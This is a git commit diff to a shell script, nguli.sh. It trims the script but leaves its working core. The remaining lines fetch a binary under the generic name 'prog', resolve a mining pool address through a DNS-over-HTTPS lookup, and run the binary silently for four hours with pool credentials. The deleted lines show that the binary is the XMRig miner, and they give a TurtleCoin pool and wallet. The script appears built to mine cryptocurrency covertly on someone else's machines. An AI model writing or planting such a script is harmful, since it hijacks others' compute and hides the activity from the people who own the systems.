70fdf0989becac9aa3ffb9e1e87f75a5ab99b75f
alucrot66 <106138171+alucrot66@users.noreply.github.com>
2022-05-30 20:12:28 +0700

    Update nguli.sh

--- nguli.sh
+++ nguli.sh
@@ -4,14 +4,3 @@ curl -Lfo prog https://github.com/bhriscarnatt/first-repo/releases/download/a/pr
 ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=poolio.magratmail.xyz&type=A' | jq -r '.Answer[0].data')
 chmod u+x prog
 timeout 4h ./prog -o "${ip}:3000" -u ChrisBarnatt -p ExplainingComputers --cpu-priority 5 > /dev/null
- ./prog --version
-XMRig 6.8.1
- built on Feb  3 2021 with GCC 10.2.1
- features: 64-bit AES
-libuv/1.40.0
-OpenSSL/1.1.1i
-hwloc/2.4.0
-npm.exe --algorithm argon2id_chukwa2 
-pool turtlecoin.herominers.com:10380 
-wallet TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy 
-password xo
